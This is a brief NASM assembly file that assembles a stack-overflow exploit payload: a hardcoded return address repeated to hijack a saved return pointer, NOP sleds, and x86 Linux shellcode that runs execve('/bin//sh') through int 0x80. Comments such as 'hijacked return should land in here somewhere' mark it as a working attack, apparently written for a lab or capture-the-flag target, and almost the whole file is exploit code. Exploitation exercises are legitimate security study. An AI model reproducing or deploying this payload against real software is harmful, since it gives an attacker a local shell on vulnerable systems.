; 32-bit mode. otherwise got wonky results (0x66 spammed in binary)
bits 32

; jump to 0xbffff148 + 50
times 10 dd 0xbffff17a

; more nops, JIC
; hijacked return should land in here somewhere
times 60 nop

; shellcode
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
cdq
mov al, 0x0b
int 0x80

; even more nops
times 500 nop
